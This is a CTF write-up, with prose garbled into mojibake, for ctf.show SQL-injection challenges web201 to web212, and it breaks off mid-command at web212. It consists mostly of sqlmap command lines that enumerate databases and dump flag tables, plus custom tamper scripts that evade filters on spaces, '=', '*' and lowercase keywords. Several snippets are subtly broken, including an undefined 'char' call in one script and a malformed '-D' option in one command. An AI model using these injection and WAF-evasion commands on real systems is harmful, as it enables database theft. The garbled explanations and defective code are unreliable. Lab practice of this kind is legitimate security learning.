ç”¨æˆ·æ‰‹å†Œ</a></a></p><p>SQLmapä½¿ç”¨é¡ºåºï¼š</p><ol><li>è·å–å½“å‰MySQLä¸­çš„æ‰€æœ‰æ•°æ®åº“<code>sqlmap -u http://xxx</code></li><li>è·å–å½“å‰æ•°æ®åº“åå­—</li><li>è·å–æ•°æ®åº“ä¸‹çš„æ•°æ®è¡¨</li><li>è·å–è¡¨ä¸‹çš„åˆ—å</li><li>å¯¼å‡ºæ•°æ®</li></ol><p><img src="web201.png" loading="lazy"></p><p><a href="https://blog.csdn.net/qq_43621629/article/details/104515866">Sqlmap æ€§èƒ½ä¼˜åŒ–</a></p><p>è®¾ç½®å¤šçº¿ç¨‹</p><pre class="language-bash" data-language="bash"><code class="language-bash">python sqlmap.py <span class="token parameter variable">-u</span> <span class="token string">"http://127.0.0.1/sqli/Less-1/?id=1"</span> <span class="token parameter variable">--threads</span><span class="token operator">=</span><span class="token number">5</span> <span class="token parameter variable">--banner</span> <span class="token parameter variable">-v</span> <span class="token number">5</span></code></pre><p>è¦æ·»åŠ ä¸€ä¸ªrefererå¤´</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">æŸ¥æ•°æ®åº“ï¼špython sqlmap.py -u &quot;https:&#x2F;&#x2F;9c35c10b-b7d4-45d6-b7a1-9edc4248e8c2.challenge.ctf.show&#x2F;api&#x2F;?id&#x3D;1&quot; --referer&#x3D;&quot;ctf.show&quot; -dbs</code></pre><p><img src="web201_2.png" loading="lazy"></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">æŸ¥è¡¨åï¼špython sqlmap.py -u &quot;https:&#x2F;&#x2F;9c35c10b-b7d4-45d6-b7a1-9edc4248e8c2.challenge.ctf.show&#x2F;api&#x2F;?id&#x3D;1&quot; --referer&#x3D;&quot;ctf.show&quot; -D ctfshow_web --tables</code></pre><p><img src="web201_3.png" loading="lazy"></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">æŸ¥åˆ—åï¼špython sqlmap.py -u &quot;https:&#x2F;&#x2F;9c35c10b-b7d4-45d6-b7a1-9edc4248e8c2.challenge.ctf.show&#x2F;api&#x2F;?id&#x3D;1&quot; --referer&#x3D;&quot;ctf.show&quot; -D ctfshow_web -T ctfshow_user --columns</code></pre><p><img src="web201_4.png" loading="lazy"></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">æŸ¥Flagï¼špython sqlmap.py -u &quot;https:&#x2F;&#x2F;9c35c10b-b7d4-45d6-b7a1-9edc4248e8c2.challenge.ctf.show&#x2F;api&#x2F;?id&#x3D;1&quot; --referer&#x3D;&quot;ctf.show&quot; -D ctfshow_web -T ctfshow_user -C &quot;id,pass,username&quot; --dump</code></pre><p><img src="web201_5.png" loading="lazy"></p><h4 id="web202-â€“data"><a href="#web202-â€“data" class="headerlink" title="web202(â€“data)"></a>web202(â€“data)</h4><p>â€“data&#x3D;DATA         è¯¥å‚æ•°æŒ‡å®šçš„æ•°æ®ä¼šè¢«ä½œä¸ºPOSTæ•°æ®æäº¤</p><p>ä½¿ç”¨postæ–¹å¼è¿›è¡Œæ³¨å…¥ï¼Œå¯ä»¥ç›´æ¥ç”¨<code>--data=&quot;id=1&quot;</code>ï¼Œä¹Ÿå¯ä»¥<code>--method=post</code>æ¥è§¦å‘</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1.ä½¿ç”¨dataè°ƒæ•´å‚æ•°python sqlmap.py -u &quot;https:&#x2F;&#x2F;a7352dd5-2c20-40e5-bef5-6aaa79676dcc.challenge.ctf.show&#x2F;api&#x2F;&quot; --referer&#x3D;&quot;ctf.show&quot; --data&#x3D;&quot;id&#x3D;1&quot;2.æŸ¥åº“python sqlmap.py -u &quot;https:&#x2F;&#x2F;a7352dd5-2c20-40e5-bef5-6aaa79676dcc.challenge.ctf.show&#x2F;api&#x2F;&quot; --referer&#x3D;&quot;ctf.show&quot; --data&#x3D;&quot;id&#x3D;1&quot; --dbs3.æŸ¥è¡¨python sqlmap.py -u &quot;https:&#x2F;&#x2F;a7352dd5-2c20-40e5-bef5-6aaa79676dcc.challenge.ctf.show&#x2F;api&#x2F;&quot; --referer&#x3D;&quot;ctf.show&quot; --data&#x3D;&quot;id&#x3D;1&quot; -D ctfshow_web --tables4.æŸ¥åˆ—python sqlmap.py -u &quot;https:&#x2F;&#x2F;a7352dd5-2c20-40e5-bef5-6aaa79676dcc.challenge.ctf.show&#x2F;api&#x2F;&quot; --referer&#x3D;&quot;ctf.show&quot; --data&#x3D;&quot;id&#x3D;1&quot; -D ctfshow_web -T ctfshow_user --columns5.æŸ¥Flagpython sqlmap.py -u &quot;https:&#x2F;&#x2F;a7352dd5-2c20-40e5-bef5-6aaa79676dcc.challenge.ctf.show&#x2F;api&#x2F;&quot; --referer&#x3D;&quot;ctf.show&quot; --data&#x3D;&quot;id&#x3D;1&quot; -D ctfshow_web -T ctfshow_user -C &quot;id,pass,username&quot; --dump</code></pre><h4 id="web203-â€“method-PUT"><a href="#web203-â€“method-PUT" class="headerlink" title="web203(â€“method&#x3D;PUT)"></a>web203(â€“method&#x3D;PUT)</h4><p><strong>HTTP <code>PUT</code> è¯·æ±‚æ–¹æ³•</strong>åˆ›å»ºä¸€ä¸ªæ–°çš„èµ„æºæˆ–ç”¨è¯·æ±‚çš„æœ‰æ•ˆè½½è·æ›¿æ¢ç›®æ ‡èµ„æºçš„è¡¨ç¤ºã€‚</p><p><code>PUT</code> ä¸ <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/POST"><code>POST</code></a> æ–¹æ³•çš„åŒºåˆ«æ˜¯ï¼Œ<code>PUT</code> æ–¹æ³•æ˜¯å¹‚ç­‰çš„ï¼šè°ƒç”¨ä¸€æ¬¡ä¸è¿ç»­è°ƒç”¨å¤šæ¬¡æ•ˆæœæ˜¯ç›¸åŒçš„ï¼ˆå³æ²¡æœ‰<em>å‰¯</em>ä½œç”¨ï¼‰ï¼Œè€Œè¿ç»­è°ƒç”¨å¤šæ¬¡ç›¸åŒçš„ <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/POST"><code>POST</code></a> æ–¹æ³•å¯èƒ½ä¼šæœ‰å‰¯ä½œç”¨ï¼Œæ¯”å¦‚å¤šæ¬¡æäº¤åŒä¸€è®¢å•ã€‚</p><p>æŒ‡å®š<code>--method=PUT</code>æ–¹æ³•ï¼ŒåŒæ—¶**åŠ ä¸Š<code>--headers=&quot;Content-Type:text/plain</code>**ï¼Œå¦åˆ™putæ¥å—ä¸äº†ã€‚åŒæ—¶ï¼Œè¦åŠ ä¸Šindex.phpï¼Œ<code>url/api/index.php</code></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u &quot;https:&#x2F;&#x2F;6792f785-47eb-4ea4-b098-0123488759c4.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --referer&#x3D;&quot;ctf.show&quot; --method&#x3D;PUT --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --data&#x3D;&quot;id&#x3D;1&quot; -D ctfshow_web -T ctfshow_user -C &quot;id,pass,username&quot; --dump</code></pre><h4 id="web204-â€“cookie"><a href="#web204-â€“cookie" class="headerlink" title="web204(â€“cookie)"></a>web204(â€“cookie)</h4><pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u &quot;https:&#x2F;&#x2F;87742487-acec-4728-91da-8113d95b32cf.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --referer&#x3D;&quot;ctf.show&quot; --method&#x3D;PUT --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;9tgbnd43m59t71te1u80d66pjs; ctfshow&#x3D;8c61071229d48923c7ced01b20ec493e&quot; --data&#x3D;&quot;id&#x3D;1&quot; -D ctfshow_web -T ctfshow_user -C &quot;id,pass,username&quot; --dump</code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u &quot;https:&#x2F;&#x2F;87742487-acec-4728-91da-8113d95b32cf.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --referer&#x3D;&quot;ctf.show&quot; --method&#x3D;PUT --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;9tgbnd43m59t71te1u80d66pjs; ctfshow&#x3D;8c61071229d48923c7ced01b20ec493e&quot; --data&#x3D;&quot;id&#x3D;1&quot; --dbms&#x3D;mysql dbs&#x3D;ctfshow_web -T ctfshow_user -C &quot;id,pass,username&quot; --dump</code></pre><h4 id="web205-apiæƒé™"><a href="#web205-apiæƒé™" class="headerlink" title="web205(apiæƒé™)"></a>web205(apiæƒé™)</h4><p>apiè°ƒç”¨éœ€è¦é‰´æƒ</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">--</span>safe<span class="token operator">-</span>url è®¾ç½®åœ¨æµ‹è¯•ç›®æ ‡åœ°å€å‰è®¿é—®çš„å®‰å…¨é“¾æ¥<span class="token operator">--</span>safe<span class="token operator">-</span>freq è®¾ç½®ä¸¤æ¬¡æ³¨å…¥æµ‹è¯•å‰è®¿é—®å®‰å…¨é“¾æ¥çš„æ¬¡æ•°</code></pre><p>é€šè¿‡F12ä¸­networkæŠ“åŒ…å¯ä»¥çœ‹è§ï¼Œæœ‰ä¸€ä¸ª<code>getToken.php</code>çš„è¯·æ±‚tokençš„åŠ¨ä½œï¼›</p><p><img src="web205.png" loading="lazy"></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u &quot;https:&#x2F;&#x2F;a530a88b-1bce-49ce-bfee-18b37febf906.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --referer&#x3D;&quot;ctf.show&quot; --method&#x3D;PUT --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;bllqt44686hm6msc9ti5ruevpb&quot; --safe-url&#x3D;&quot;https:&#x2F;&#x2F;a530a88b-1bce-49ce-bfee-18b37febf906.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --data&#x3D;&quot;id&#x3D;1&quot; --dbms&#x3D;mysql -D ctfshow_web -T ctfshow_flax -C flagx --dump</code></pre><p>è¿™ä¸ªé¢˜æ¢äº†è¡¨åå’Œåˆ—å</p><h4 id="web206"><a href="#web206" class="headerlink" title="web206"></a>web206</h4><p>sqléœ€è¦é—­åˆï¼Œsqlmapä¼šè‡ªåŠ¨é—­åˆï¼ŒPayloadåŒä¸Š</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u &quot;https:&#x2F;&#x2F;34b88ba2-58d2-4a8c-9b6f-3b1b0e663a27.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --referer&#x3D;&quot;ctf.show&quot; --method&#x3D;PUT --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;3ehcblk49o3nqd3hp3nqsdr0ga&quot; --safe-url&#x3D;&quot;https:&#x2F;&#x2F;34b88ba2-58d2-4a8c-9b6f-3b1b0e663a27.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --data&#x3D;&quot;id&#x3D;1&quot; --dbms&#x3D;mysql -D ctfshow_web -T ctfshow_flaxc -C flagv --dump</code></pre><h4 id="web207-â€“tamper"><a href="#web207-â€“tamper" class="headerlink" title="web207(â€“tamper)"></a>web207(â€“tamper)</h4><p><a href="https://y4er.com/posts/sqlmap-tamper/">Sqlmap Tamper ç¼–å†™</a></p><p><code>--batch</code>ä½¿ç”¨é»˜è®¤çš„é€‰é¡¹è¿›è¡Œæ³¨å…¥ï¼Œæ— éœ€ç”¨æˆ·è¾“å…¥å’Œäº¤äº’<br><code>--prefix=PREFIX</code>æŒ‡å®špayloadçš„å‰ç¼€<br><code>--suffix=SUFFIX</code>æŒ‡å®špayloadçš„åç¼€</p><p>é¢˜ç›®å¯¹ç©ºæ ¼è¿›è¡Œäº†è¿‡æ»¤ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è€ƒè™‘ç”¨space2comment.pyè¿™ä¸ªè„šæœ¬ï¼Œå°†ç©ºæ ¼è½¬æ¢æˆæ³¨é‡Šç¬¦æ¥ç»•è¿‡</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u &quot;https:&#x2F;&#x2F;f1d1f0d1-9da8-4cf2-adfd-ff1d3a54a79f.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --referer&#x3D;&quot;ctf.show&quot; --method&#x3D;PUT --data&#x3D;&quot;id&#x3D;1&quot; --prefix&#x3D;&quot;&#39;)&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;https:&#x2F;&#x2F;f1d1f0d1-9da8-4cf2-adfd-ff1d3a54a79f.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 -D ctfshow_web -T ctfshow_flaxca -C flagvc --dump --batch --tamper&#x3D;space2comment</code></pre><h4 id="web208"><a href="#web208" class="headerlink" title="web208"></a>web208</h4><p>å¯¹å°å†™çš„<code>select</code>å’Œç©ºæ ¼è¿›è¡Œäº†ç»•è¿‡ï¼Œä¸è¿‡sqlmapä¸­çš„selectéƒ½æ˜¯å¤§å†™çš„</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token keyword">import</span> os<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>common <span class="token keyword">import</span> singleTimeWarnMessage<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> DBMS<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> PRIORITY__priority__ <span class="token operator">=</span> PRIORITY<span class="token punctuation">.</span>HIGHEST<span class="token keyword">def</span> <span class="token function">tamper</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">if</span> payload<span class="token punctuation">:</span>        payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"SELECT"</span><span class="token punctuation">,</span> <span class="token string">"select"</span><span class="token punctuation">)</span><span class="token comment">#å°±ä¿®æ”¹è¿™ä¸€è¡Œäº†</span>    <span class="token keyword">return</span> payload</code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u &quot;https:&#x2F;&#x2F;f1d1f0d1-9da8-4cf2-adfd-ff1d3a54a79f.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --referer&#x3D;&quot;ctf.show&quot; --method&#x3D;PUT --data&#x3D;&quot;id&#x3D;1&quot; --prefix&#x3D;&quot;&#39;)&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;https:&#x2F;&#x2F;f1d1f0d1-9da8-4cf2-adfd-ff1d3a54a79f.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 -D ctfshow_web -T ctfshow_flaxcac -C flagvca --dump --batch --tamper&#x3D;space2comment</code></pre><h4 id="web209"><a href="#web209" class="headerlink" title="web209"></a>web209</h4><p>è¿‡æ»¤äº†<code> </code>ï¼Œ<code>*</code>å·å’Œ<code>=</code>ï¼Œ</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u https:&#x2F;&#x2F;d5249ee4-9520-4049-a7f0-d3cc15ccc88a.challenge.ctf.show&#x2F;api&#x2F;index.php --data&#x3D;&quot;id&#x3D;1&quot; --user-agent&#x3D;sqlmap --refer&#x3D;&quot;ctf.show&quot; --method&#x3D;&quot;PUT&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;https:&#x2F;&#x2F;d5249ee4-9520-4049-a7f0-d3cc15ccc88a.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --cookie&#x3D;&quot;PHPSESSID&#x3D;1763p4504m3dcol5349rfgt5q9&quot; --tamper web209.py -D ctfshow_web -T ctfshow_flav -C ctfshow_flagx --dump --batch</code></pre><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token triple-quoted-string string">"""Copyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)See the file 'LICENSE' for copying permission"""</span><span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>compat <span class="token keyword">import</span> <span class="token builtin">xrange</span><span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> PRIORITY__priority__ <span class="token operator">=</span> PRIORITY<span class="token punctuation">.</span>LOW<span class="token keyword">def</span> <span class="token function">dependencies</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span><span class="token keyword">def</span> <span class="token function">tamper</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    Replaces space character (' ') with comments '/**/'    Tested against:        * Microsoft SQL Server 2005        * MySQL 4, 5.0 and 5.5        * Oracle 10g        * PostgreSQL 8.3, 8.4, 9.0    Notes:        * Useful to bypass weak and bespoke web application firewalls    >>> tamper('SELECT id FROM users')    'SELECT/**/id/**/FROM/**/users'    """</span>    retVal <span class="token operator">=</span> payload    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>        retVal <span class="token operator">=</span> <span class="token string">""</span>        quote<span class="token punctuation">,</span> doublequote<span class="token punctuation">,</span> firstspace <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">xrange</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> firstspace<span class="token punctuation">:</span>                <span class="token keyword">if</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>isspace<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    firstspace <span class="token operator">=</span> <span class="token boolean">True</span>                    retVal <span class="token operator">+=</span> <span class="token string">"/**/"</span>                    <span class="token keyword">continue</span>            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'\''</span><span class="token punctuation">:</span>                quote <span class="token operator">=</span> <span class="token keyword">not</span> quote            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'"'</span><span class="token punctuation">:</span>                doublequote <span class="token operator">=</span> <span class="token keyword">not</span> doublequote            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"*"</span><span class="token punctuation">:</span>                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x2A</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span>            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"="</span><span class="token punctuation">:</span>                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'like'</span> <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span>            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">" "</span> <span class="token keyword">and</span> <span class="token keyword">not</span> doublequote <span class="token keyword">and</span> <span class="token keyword">not</span> quote<span class="token punctuation">:</span>                <span class="token comment"># retVal += "/**/"</span>                retVal <span class="token operator">+=</span> char<span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span>            retVal <span class="token operator">+=</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token keyword">return</span> retVal</code></pre><h4 id="web210"><a href="#web210" class="headerlink" title="web210"></a>web210</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//å¯¹æŸ¥è¯¢å­—ç¬¦è¿›è¡Œè§£å¯†</span>  <span class="token keyword">function</span> <span class="token function-definition function">decode</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">strrev</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>      </code></pre><p>å¯¹ä¼ å…¥çš„id è¿›è¡Œè§£å¯†å¤„ç† ä»è€Œè®©sqlè¯­å¥æ— æ³•æ‰§è¡ŒæˆåŠŸ </p><p>æŒ‰ç…§ä»–çš„æ–¹å¼ åç€æ„é€ ä¸€ä¸ªåŠ å¯†è„šæœ¬ è¿™æ ·ä¼ è¿›å»å æœåŠ¡å™¨å¯¹idè¿›è¡Œä¸€ç³»åˆ—æ“ä½œå°±å˜æˆäº† æˆ‘ä»¬æƒ³åˆ°çš„idçš„å€¼äº†</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u https:&#x2F;&#x2F;30e6ea25-0680-4bf6-af39-8be519b7bd22.challenge.ctf.show&#x2F;api&#x2F;index.php --data&#x3D;&quot;id&#x3D;1&quot; --user-agent&#x3D;sqlmap --refer&#x3D;&quot;ctf.show&quot; --method&#x3D;&quot;PUT&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;https:&#x2F;&#x2F;30e6ea25-0680-4bf6-af39-8be519b7bd22.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --cookie&#x3D;&quot;PHPSESSID&#x3D;9j6o3g1dvnmvg061n1kbjlruvp&quot; --tamper web210.py -D ctfshow_web -T ctfshow_flavi -C ctfshow_flagxx --dump --batch</code></pre><p><strong>web210.py</strong></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token triple-quoted-string string">"""Author:Y4tacker"""</span><span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>compat <span class="token keyword">import</span> <span class="token builtin">xrange</span><span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> PRIORITY<span class="token keyword">import</span> base64__priority__ <span class="token operator">=</span> PRIORITY<span class="token punctuation">.</span>LOW<span class="token keyword">def</span> <span class="token function">tamper</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> space2comment<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    retVal <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>        retVal <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>payload<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        retVal <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>retVal<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> retVal<span class="token keyword">def</span> <span class="token function">space2comment</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    retVal <span class="token operator">=</span> payload    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>        retVal <span class="token operator">=</span> <span class="token string">""</span>        quote<span class="token punctuation">,</span> doublequote<span class="token punctuation">,</span> firstspace <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">xrange</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> firstspace<span class="token punctuation">:</span>                <span class="token keyword">if</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>isspace<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    firstspace <span class="token operator">=</span> <span class="token boolean">True</span>                    retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>                    <span class="token keyword">continue</span>            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'\''</span><span class="token punctuation">:</span>                quote <span class="token operator">=</span> <span class="token keyword">not</span> quote            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'"'</span><span class="token punctuation">:</span>                doublequote <span class="token operator">=</span> <span class="token keyword">not</span> doublequote            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"*"</span><span class="token punctuation">:</span>                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x31</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span>            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"="</span><span class="token punctuation">:</span>                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'like'</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span>            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">" "</span> <span class="token keyword">and</span> <span class="token keyword">not</span> doublequote <span class="token keyword">and</span> <span class="token keyword">not</span> quote<span class="token punctuation">:</span>                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span>            retVal <span class="token operator">+=</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token keyword">return</span> retVal</code></pre><h4 id="web211"><a href="#web211" class="headerlink" title="web211"></a>web211</h4><p>è¿‡æ»¤äº† åœ¨web210çš„åŸºç¡€ä¸Šè¿‡æ»¤äº†ç©ºæ ¼ å°†ç©ºæ ¼æ›¿æ¢æˆ%0aï¼Œä½†æ˜¯ä¹‹å‰è„šæœ¬ä¾æ—§å¯ä»¥</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u https:&#x2F;&#x2F;f2caf00e-910a-4b69-9561-e6da6b0fb648.challenge.ctf.show&#x2F;api&#x2F;index.php --data&#x3D;&quot;id&#x3D;1&quot; --user-agent&#x3D;sqlmap --refer&#x3D;&quot;ctf.show&quot; --method&#x3D;&quot;PUT&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;https:&#x2F;&#x2F;f2caf00e-910a-4b69-9561-e6da6b0fb648.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --cookie&#x3D;&quot;PHPSESSID&#x3D;vueov0jlmgnnbpnr8bgovga6r8&quot; --tamper web210.py -D ctfshow_web -T ctfshow_flavia -C ctfshow_flagxxa --dump --batch</code></pre><h4 id="web212"><a href="#web212" class="headerlink" title="web212"></a>web212</h4><p>å¤šè¿‡æ»¤äº†<code>*</code>ï¼ŒPayloadåŒä¸Š</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u https:&#x2F;&#x2F;c9220216-1978-4f6d-afa6-3fbba4ac7dfb.challenge.ctf.show&#x2F;api&#x2F;index.php --data&#x3D;&quot;id&#x3D;1&quot; --user-agent&#x3D;sqlmap --refer&#x3D;&quot;ctf.show&quot; --method&#x3D;&quot;PUT&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; 